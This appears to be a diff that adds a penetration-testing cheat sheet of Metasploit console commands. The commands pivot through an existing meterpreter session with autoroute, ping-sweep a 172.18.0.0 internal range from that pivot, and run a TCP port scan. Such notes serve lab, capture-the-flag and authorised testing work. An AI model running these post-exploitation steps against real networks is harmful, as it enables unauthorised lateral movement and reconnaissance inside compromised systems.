@@ -1,0 +1,16 @@
+Pivoting through msf shell / meterperter
+  msf5 > use post/multi/manage/autoroute
+  msf5 post(multi/manage/autoroute) > set session 1
+  msf5 post(multi/manage/autoroute) > exploit
+
+Ping Sweep from Pivot
+  msf5 > use post/multi/gather/ping_sweep
+  msf5 post(multi/gather/ping_sweep) > set rhosts 172.18.0.0-255
+  msf5 post(multi/gather/ping_sweep) > set session 1
+  msf5 post(multi/gather/ping_sweep) > exploit
+  
+Port Scan from Pivot
+  msf5 > use auxiliary/scanner/portscan/tcp
+  msf5 auxiliary(scanner/portscan/tcp) > set rhosts 172.18.0.0-4
+  msf5 auxiliary(scanner/portscan/tcp) > set threads 10
+  msf5 auxiliary(scanner/portscan/tcp) > exploit
